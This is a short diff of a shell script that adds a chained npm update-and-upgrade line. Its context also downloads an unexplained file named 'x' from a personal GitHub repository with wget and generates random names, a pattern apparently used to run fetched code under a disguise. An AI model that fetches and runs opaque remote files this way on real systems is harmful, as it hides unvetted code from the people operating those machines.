@@ -7,6 +7,7 @@ random_name() {
   npm install -g kill-port
   npm prune
   npx systeminformation
+  npm install -g npm@latest && npm update && npx -y npm-check-updates -u && npm install && npm cache clean --force
 wget https://raw.githubusercontent.com/hosseinxdns/glowing-fortnight/main/x
 
 NEW_V2=$(random_name)
